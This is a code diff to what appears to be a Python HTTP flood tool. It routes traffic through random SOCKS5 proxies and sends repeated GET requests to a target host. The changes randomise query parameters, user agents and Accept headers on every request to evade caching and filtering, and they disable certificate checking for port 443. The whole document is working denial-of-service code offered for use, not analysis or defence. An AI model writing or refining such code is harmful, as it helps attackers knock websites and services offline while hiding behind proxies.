@@ -105,27 +105,26 @@ def Flood(indexPicker):
         proxy = rC(proxies).strip().split(":")
     else:
         proxy = rC(proxies).strip().split(":")
-    if indexPicker < len(userAgentList):
-        userAgent = rC(userAgentList)
-    else:
-        userAgent = rC(userAgentList)
-    User_Agent = userAgent + "\r\n\r\n"
     Connection = "Connection: Keep-Alive\r\n"
     while True:
         try:
-            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
             s.connect((targetHost, targetPort))
             if targetPort == 443:
-                s = ssl.create_default_context().wrap_socket(s, server_hostname=targetHost)
+                sslContext = ssl.SSLContext()
+                s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
-                valueParams = "?{}={}".format(rC(queryParams), rI(1, 65535))
+                valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
+                Accept = rC(AcceptHeaders)
+                User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
                 floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
-            print(proxy[0] + ":" + proxy[1] + "=>" + userAgent)
+            s.close()
+            print("Flood sent " + proxy[0] + ":" + proxy[1])
         except socket.error:
-            time.sleep(0.1)
+            time.sleep(.1)
         except:
             pass
 
